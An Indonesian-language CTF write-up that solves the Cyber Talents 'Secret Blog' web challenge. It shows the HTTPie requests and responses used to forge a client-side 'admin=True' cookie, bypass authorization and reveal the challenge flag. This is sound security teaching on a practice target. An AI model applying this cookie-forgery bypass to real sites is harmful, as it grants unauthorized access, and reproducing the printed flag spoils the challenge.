## [Writeup] Cyber Talents: Secret Blog


Tutorial kali ini akan membahas solusi soal CTF [Cyber Talents: Secret Blog](https://cybertalents.com/challenges/web/secret-blog) yang masuk ke dalam ketegori web security. Berikut ini adalah penjelasan dari soal tersebut:

```
Only Blog Admins can see the flag, could you be one of them?
```

Untuk soalnya sendiri, dapat diakses pada [tautan ini](http://35.225.49.73/secretblog/). Seperti beberapa soal lainnya, kali ini kita akan menggunakan [HTTPie](https://httpie.org). Pertama, kita akan mengakses halaman tersebut:

```bash
% http "http://35.225.49.73/secretblog/"
HTTP/1.1 200 OK
Connection: keep-alive
Content-Encoding: gzip
Content-Type: text/html; charset=UTF-8
Date: Mon, 03 Aug 2020 01:13:14 GMT
Server: nginx/1.10.3 (Ubuntu)
Transfer-Encoding: chunked

<!DOCTYPE html>
<html lang="en">
<head>
    <title>CyberTalnet Blog</title>
    <link href="http://maxcdn.bootstrapcdn.com/bootstrap/3.2.0/css/bootstrap.min.css" rel="stylesheet">
    <link href="https://getbootstrap.com/docs/3.3/examples/jumbotron-narrow/jumbotron-narrow.css" rel="stylesheet">
</head>
<body>
    <div class="container">
        <div class="header">
            <h3 class="text-muted">Secret Blog</h3>
        </div>
      <div class="jumbotron">
        <p class="lead"></p>
        <div class="login-form">
            <form role="form" action="login.php" method="post">
                <div class="form-group">
                    <input type="text" name="Username" id="Username" class="form-control input-lg" placeholder="Username">
                </div>
                <div class="form-group">
                    <input type="password" name="password" id="password" class="form-control input-lg" placeholder="Password">
                </div>
            </div>
            <div class="row">
                <div class="col-xs-12 col-sm-12 col-md-12">
                    <input type="submit" class="btn btn-lg btn-success btn-block" value="Sign In">
                </div>
            </div>
        </form>
    </div>
</div>
</body>
</html>
```

Halaman tersebut meminta kita login, dimana informasi login akan dikirimkan ke halaman **login.php**. Kita akan mengirimkan **Username** dan **password** seperti ini:

```bash
% http -f "http://35.225.49.73/secretblog/login.php" "Username=admin" "password=admin"
HTTP/1.1 302 Found
Connection: keep-alive
Content-Type: text/html; charset=UTF-8
Date: Mon, 03 Aug 2020 01:15:48 GMT
Location: ./flag.php
Server: nginx/1.10.3 (Ubuntu)
Set-Cookie: username=admin
Set-Cookie: password=admin
Set-Cookie: admin=False
Transfer-Encoding: chunked
```

Dari respon yang dikirimkan oleh server di atas, bisa terlihat bahwa kita akan diarahkan ke halaman **flag.php** dengan 3 buah _Cookie_ :

```
Set-Cookie: username=admin
Set-Cookie: password=admin
Set-Cookie: admin=False
```

Kita akan mengirimkan request ke halaman **flag.php** dengan mengatur ketiga cookie tersebut seperti ini:

```bash
% http -f "http://35.225.49.73/secretblog/flag.php" "Cookie: Username=admin;password=admin;admin=True"
HTTP/1.1 200 OK
Connection: keep-alive
Content-Encoding: gzip
Content-Type: text/html; charset=UTF-8
Date: Mon, 03 Aug 2020 01:18:34 GMT
Server: nginx/1.10.3 (Ubuntu)
Transfer-Encoding: chunked

<!DOCTYPE html>
<html lang="en">
<head>
    <title>CyberTalent</title>
    <link href="http://maxcdn.bootstrapcdn.com/bootstrap/3.2.0/css/bootstrap.min.css" rel="stylesheet">
    <link href="https://getbootstrap.com/docs/3.3/examples/jumbotron-narrow/jumbotron-narrow.css" rel="stylesheet">
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>
</head>
<body>
    <div class="container">
        <div class="header">
            <h3 class="text-muted">Flag</h3>
        </div>
        <div class="alert alert-success alert-dismissible" role="alert" id="myAlert">
          <button type="button" class="close" data-dismiss="alert" aria-label="Close"><span aria-hidden="true">&times;</span></button>
          Success: You logged in! Not sure you&#39;ll be able to see the flag though.
            </div>
        <div class="jumbotron">
            <p class="lead"></p>
            <p style="text-align:center; font-size:30px;"><b>
                flag{I_l0v3_Co0ki3s_M4nipul4ti0n}            </b></p>
        </div>
    </div>
</body>
</html>
```

Ternyata request tersebut berhasil, dan kita mendapatkan flagnya yaitu `flag{I_l0v3_Co0ki3s_M4nipul4ti0n}`. Sekian tutorial singkat kali ini, semoga bermanfaat. Terima kasih kepada Allah SWT, dan Anda yang telah membaca tutorial ini.
